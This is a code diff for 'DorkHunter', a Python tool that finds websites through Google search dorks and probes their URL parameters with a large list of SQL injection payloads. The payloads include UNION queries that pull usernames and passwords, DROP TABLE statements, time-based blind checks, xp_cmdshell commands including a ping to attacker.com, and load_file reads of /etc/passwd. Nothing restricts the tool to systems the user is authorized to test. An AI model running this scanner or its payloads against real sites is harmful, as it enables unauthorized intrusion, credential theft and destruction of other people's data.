@@ -100,39 +100,38 @@ class SqlScan:
         parsed_url = urlparse(url)
         query = parse_qs(parsed_url.query)
         payloads = [
-    "'", "' OR '1'='1", "' AND '1'='2", "' OR 'x'='x", "';--", 
-    "') OR ('1'='1", "' UNION SELECT NULL, NULL, NULL--", "'; DROP TABLE users;--",
-    "' OR '1'='1' /*", "' OR '1'='1' --", "' OR '1'='1' #", "' AND 1=1--", 
-    "' AND 1=2--", "' OR 1=1--", "' OR 1=2--", "' OR 1=1; WAITFOR DELAY '00:00:05'--",
-    "' OR 1=1; SLEEP(5)--", "' OR 1=1; BENCHMARK(1000000, MD5(123))--", 
-    "' UNION SELECT 1, username, password FROM users--", 
-    "' UNION SELECT null, table_name FROM information_schema.tables--", 
-    "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--", 
-    "' OR 1=1; EXEC xp_cmdshell('nslookup example.com')--", 
-    "' OR 1=1; EXEC xp_cmdshell('ping -n 5 attacker.com')--", 
-    "' UNION ALL SELECT 1, 2, GROUP_CONCAT(table_name), 4 FROM information_schema.tables--", 
-    "' UNION ALL SELECT 1, 2, GROUP_CONCAT(column_name), 4 FROM information_schema.columns WHERE table_name='users'--", 
-    "'; EXEC xp_cmdshell('dir')--", "'; EXEC xp_cmdshell('net user')--", 
-    "'; EXEC xp_cmdshell('netstat -ano')--", "'; EXEC xp_cmdshell('id')--", 
-    "' OR '' = '", "' OR 1=1 --", "' OR 1=1#", "' OR 1=1--", 
-    "1' AND 1=1--", "1' OR 1=1--", "1' AND 1=2--", "id=1' OR 1=1--", 
-    "user=admin' OR 1=1--", "uid=' UNION SELECT NULL, user, password FROM users--", 
-    "1' OR '1'='1' --", "1' AND '1'='1' --", "username=' OR 1=1 --", 
-    "password=' UNION SELECT NULL, username, password FROM users--", 
-    "' UNION SELECT 1, 'test', 'test' --", "' UNION SELECT 1, 2, 3, 4, 5 --", 
-    "' OR CAST(1 AS INT) = CAST(1 AS INT)--", "' OR 'a'='a' --", 
-    "' OR LENGTH('test') = 4--", "' OR 1=1 GROUP BY CONCAT(0x3a, database(), 0x3a)--", 
-    "' AND 1=2 GROUP BY CONCAT(0x3a, table_name, 0x3a)--", 
-    "' AND 1=2 GROUP BY CONCAT(0x3a, column_name, 0x3a)--", "--", "#", "; --", 
-    "1' HAVING 1=1--", "1' HAVING 1=2--", "'; EXECUTE IMMEDIATE 'DROP TABLE users'--", 
-    "'; EXECUTE IMMEDIATE 'SELECT * FROM sensitive_data'--", 
-    "'; EXECUTE IMMEDIATE 'SELECT @@version'--", "'; EXECUTE IMMEDIATE 'SHOW TABLES'--", 
-    "' OR 1=1#", "' OR 'x'='x' /*", "' OR 1=1; --", "' AND 1=1; --", 
-    "1' AND 1=1 /*", "'; EXEC xp_cmdshell 'net user' --", 
-    "' UNION SELECT 1, load_file('/etc/passwd')--", 
-    "' UNION SELECT 1, load_file('C:\\Windows\\System32\\drivers\\etc\\hosts')--"
-]
-
+            "'", "' OR '1'='1", "' AND '1'='2", "' OR 'x'='x", "';--", 
+            "') OR ('1'='1", "' UNION SELECT NULL, NULL, NULL--", "'; DROP TABLE users;--",
+            "' OR '1'='1' /*", "' OR '1'='1' --", "' OR '1'='1' #", "' AND 1=1--", 
+            "' AND 1=2--", "' OR 1=1--", "' OR 1=2--", "' OR 1=1; WAITFOR DELAY '00:00:05'--",
+            "' OR 1=1; SLEEP(5)--", "' OR 1=1; BENCHMARK(1000000, MD5(123))--", 
+            "' UNION SELECT 1, username, password FROM users--", 
+            "' UNION SELECT null, table_name FROM information_schema.tables--", 
+            "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--", 
+            "' OR 1=1; EXEC xp_cmdshell('nslookup example.com')--", 
+            "' OR 1=1; EXEC xp_cmdshell('ping -n 5 attacker.com')--", 
+            "' UNION ALL SELECT 1, 2, GROUP_CONCAT(table_name), 4 FROM information_schema.tables--", 
+            "' UNION ALL SELECT 1, 2, GROUP_CONCAT(column_name), 4 FROM information_schema.columns WHERE table_name='users'--", 
+            "'; EXEC xp_cmdshell('dir')--", "'; EXEC xp_cmdshell('net user')--", 
+            "'; EXEC xp_cmdshell('netstat -ano')--", "'; EXEC xp_cmdshell('id')--", 
+            "' OR '' = '", "' OR 1=1 --", "' OR 1=1#", "' OR 1=1--", 
+            "1' AND 1=1--", "1' OR 1=1--", "1' AND 1=2--", "id=1' OR 1=1--", 
+            "user=admin' OR 1=1--", "uid=' UNION SELECT NULL, user, password FROM users--", 
+            "1' OR '1'='1' --", "1' AND '1'='1' --", "username=' OR 1=1 --", 
+            "password=' UNION SELECT NULL, username, password FROM users--", 
+            "' UNION SELECT 1, 'test', 'test' --", "' UNION SELECT 1, 2, 3, 4, 5 --", 
+            "' OR CAST(1 AS INT) = CAST(1 AS INT)--", "' OR 'a'='a' --", 
+            "' OR LENGTH('test') = 4--", "' OR 1=1 GROUP BY CONCAT(0x3a, database(), 0x3a)--", 
+            "' AND 1=2 GROUP BY CONCAT(0x3a, table_name, 0x3a)--", 
+            "' AND 1=2 GROUP BY CONCAT(0x3a, column_name, 0x3a)--", "--", "#", "; --", 
+            "1' HAVING 1=1--", "1' HAVING 1=2--", "'; EXECUTE IMMEDIATE 'DROP TABLE users'--", 
+            "'; EXECUTE IMMEDIATE 'SELECT * FROM sensitive_data'--", 
+            "'; EXECUTE IMMEDIATE 'SELECT @@version'--", "'; EXECUTE IMMEDIATE 'SHOW TABLES'--", 
+            "' OR 1=1#", "' OR 'x'='x' /*", "' OR 1=1; --", "' AND 1=1; --", 
+            "1' AND 1=1 /*", "'; EXEC xp_cmdshell 'net user' --", 
+            "' UNION SELECT 1, load_file('/etc/passwd')--", 
+            "' UNION SELECT 1, load_file('C:\\Windows\\System32\\drivers\\etc\\hosts')--"
+        ]
 
         for param, original_values in query.items():
             for original_value in original_values:
@@ -144,13 +143,14 @@ class SqlScan:
 
                     try:
                         response = requests.get(test_url, timeout=10)
-
                         if any(error in response.text.lower() for error in ["error", "mysql", "syntax", "sql", "warning"]):
                             logging.info(f"[VULN] {url} => (Param: {param}) with payload: {payload}")
-                            return True
-                    except requests.exceptions.RequestException:
-                        logging.info(f"[NO VULN] {url} => Request failed")
+                            return True  # Vulnerability found
+                    except requests.exceptions.RequestException as e:
+                        logging.warning(f"[FAIL] {url} => Request failed: {e}")
+                        return False  # Skip this target
 
+        logging.info(f"[NO VULN] {url} => No vulnerability found")
         return False
 
     def resolve_domain(self, url: str):
@@ -208,20 +208,26 @@ def center_text(text: str) -> str:
 
 def get_api_credentials():
     clear_console()
-
-    text1 = "\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\n" \
-            "\t\tDorkHunter\n" \
-            "\t\t by => xfnx\n\n" \
-            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n"
-
+    text1 = (
+        " ██████╗  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗\n"
+        "██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗\n"
+        "██║  ██║██║   ██║██████╔╝█████╔╝     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝\n"
+        "██║  ██║██║   ██║██╔══██╗██╔═██╗     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗\n"
+        "██████╔╝╚██████╔╝██║  ██║██║  ██╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║\n"
+        "╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\n"
+        "	\n"
+        "██████╗ ██╗   ██╗    ██╗  ██╗███████╗███╗   ██╗██╗  ██╗\n"	
+        "██╔══██╗╚██╗ ██╔╝    ╚██╗██╔╝██╔════╝████╗  ██║╚██╗██╔╝ \n"	
+        "██████╔╝ ╚████╔╝      ╚███╔╝ █████╗  ██╔██╗ ██║ ╚███╔╝ \n"	
+        "██╔══██╗  ╚██╔╝       ██╔██╗ ██╔══╝  ██║╚██╗██║ ██╔██╗ \n"	
+        "██████╔╝   ██║       ██╔╝ ██╗██║     ██║ ╚████║██╔╝ ██╗\n"	
+        "╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝╚═╝  ╚═╝\n"
+    )
     text2 = "Before using the tool, you must provide your Google Custom Search API key and Custom Search Engine ID."
-
     print(center_text(text1))
     print(center_text(text2))
-
     api_key = input("\nYour Google Custom Search API key: ")
     cse_id = input("Your Google Custom Search Engine ID: ")
-
     return api_key, cse_id
 
 
@@ -240,27 +246,38 @@ def write_report(vulnerable_urls, filename):
 
 def main():
     try:
+
         api_key, cse_id = get_api_credentials()
         scanner = SqlScan(api_key, cse_id)
 
-        dork, max_vuln, save_report = get_dork_and_options()
+        while True:  
 
-        clear_console()
-        print("Scanning started...")
+            dork, max_vuln, save_report = get_dork_and_options()
 
-        vulnerable_urls = scanner.find_vulnerable_urls(dork, max_vuln)
-        if vulnerable_urls:
-            print("\n[VULNERABLE] Vulnerable URLs found:")
-            for url in vulnerable_urls:
-                print(url)
+            clear_console()
+            print("Scanning started...")
+            vulnerable_urls = scanner.find_vulnerable_urls(dork, max_vuln)
 
-            if save_report:
-                write_report(vulnerable_urls, DEFAULT_REPORT_FILE)
-                print(f"Results saved to {DEFAULT_REPORT_FILE}")
+            if vulnerable_urls:
+                print("\n[VULNERABLE] Vulnerable URLs found:")
+                for url in vulnerable_urls:
+                    print(url)
+                if save_report:
+                    write_report(vulnerable_urls, DEFAULT_REPORT_FILE)
+                    print(f"Results saved to {DEFAULT_REPORT_FILE}")
+            else:
+                print("\nNo vulnerable URLs found.")
+
+
+            choice = input("\nDo you want to run another scan? (Y/N): ").strip().lower()
+            if choice != 'y':
+                print("Exiting the tool. Goodbye!")
+                break  
 
     except KeyboardInterrupt:
         print("\nScan interrupted by user.")
         sys.exit(0)
+
 
 if __name__ == "__main__":
     main()
